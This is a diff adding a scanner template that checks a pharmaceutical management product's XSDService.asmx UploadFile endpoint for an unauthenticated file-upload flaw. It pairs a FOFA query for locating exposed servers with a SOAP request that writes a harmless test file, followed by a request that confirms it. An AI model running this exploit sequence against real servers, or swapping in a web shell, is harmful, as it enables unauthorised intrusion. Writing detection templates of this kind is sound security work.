@@ -1,0 +1,44 @@
+## id: VEID-2025-0111
+## name: 药业管理软件UploadFile文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,file,veid2025
+## description: 药业管理软件 XSDService.asmx 接口UploadFile实例存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码。
+## fofa-query: body="XSDService.asmx"
+## verification: true
+
+
+POST /XSDService.asmx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: text/xml; charset=utf-8
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <UploadFile xmlns="http://tempuri.org/">
+      <filePath>2</filePath>
+      <fileName>a.txt</fileName>
+      <buffer>aGVsbG8gdmVpbA==</buffer>
+      <Offset>1</Offset>
+    </UploadFile>
+  </soap:Body>
+</soap:Envelope>
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "xml"
+#@ matcher: body contains "<?xml"
+
+---
+
+GET /Upload2015/2/a.txt HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "hello veil"
+
+
+
